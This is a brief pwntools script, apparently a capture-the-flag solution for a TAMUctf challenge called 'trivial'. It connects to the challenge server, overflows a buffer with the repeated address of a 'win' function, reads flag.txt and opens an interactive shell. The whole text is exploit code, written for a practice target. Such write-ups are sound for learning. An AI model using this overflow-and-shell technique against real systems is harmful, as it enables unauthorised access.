from pwn import *

e = context.binary = ELF(args.BIN)

p = remote("tamuctf.com", 443, ssl=True, sni="trivial")
win = p64(e.sym['win'])

p.sendline(win*100)
p.sendline(b'cat flag.txt')
p.interactive()

